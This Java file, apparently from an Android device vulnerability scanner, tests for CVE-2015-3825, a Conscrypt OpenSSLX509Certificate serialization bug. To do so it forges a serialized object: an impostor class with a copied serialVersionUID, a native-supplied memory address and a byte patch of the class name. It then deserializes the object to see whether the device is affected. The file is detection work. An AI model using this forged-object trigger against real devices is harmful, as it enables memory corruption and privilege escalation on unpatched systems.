package fuzion24.device.vulnerability.vulnerabilities.framework.serialization;
import android.content.Context;
import android.util.Log;

import com.android.org.conscrypt.ZpenSSLX509Certificate;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.ObjectStreamClass;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

import fuzion24.device.vulnerability.vulnerabilities.VulnerabilityTest;

/**
 * Created by fuzion24 on 8/25/15.
 */
public class OpenSSLTransientBug implements VulnerabilityTest {

    static {
        System.loadLibrary("x509serializationhelper");
    }

    private native long getPositiveIntLocation();

    private static final String TAG = "openSSLSerializationBug";
    @Override
    public String getName() {
        return "OpenSSL509 Serialization Bug : CVE-2015-3825";
    }

    @Override
    public boolean isVulnerable(Context context) throws Exception {

        Class openSSLX509CertificateClass = Class.forName("com.android.org.conscrypt.OpenSSLX509Certificate");

        ObjectStreamClass clDesc = ObjectStreamClass.lookup(openSSLX509CertificateClass);

        if (clDesc == null) {
            //TODO this is bad
            Log.d(TAG, "clDESC is null");
            throw new Exception("clDesc is null for OpenSSLECPrivateKey");
        }

        // Set our fake class's serialization UID.
        Field targetUID = ZpenSSLX509Certificate.class.getDeclaredField("serialVersionUID");
        targetUID.setAccessible(true);
        targetUID.set(null, clDesc.getSerialVersionUID());


        final byte[] impostorBytes;
        // Serialization
        {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            long decrementAddress = getPositiveIntLocation();
            Log.d(TAG, "Decrement address: " + Long.toHexString(decrementAddress));
            oos.writeObject(new ZpenSSLX509Certificate(decrementAddress));
            oos.close();
            impostorBytes = baos.toByteArray();
        }

        // Fix class name
        {
            boolean fixed = false;
            for (int i = 0; i < impostorBytes.length - 4; i++) {
                if (impostorBytes[i] == 'Z' && impostorBytes[i + 1] == 'p'
                        && impostorBytes[i + 2] == 'e' && impostorBytes[i + 3] == 'n') {
                    impostorBytes[i] = 'O';
                    fixed = true;
                    break;
                }
            }
        }

        // Deserialization
        {
            ByteArrayInputStream bais = new ByteArrayInputStream(impostorBytes);
            ObjectInputStream ois = new ObjectInputStream(bais);
            Object cert = ois.readObject();
            ois.close();
            Method m = openSSLX509CertificateClass.getDeclaredMethod("getContext");
            long ctx = (long) m.invoke(cert);
            if(ctx == 0L){
                return false;
            }
        }

            return true;
    }
}
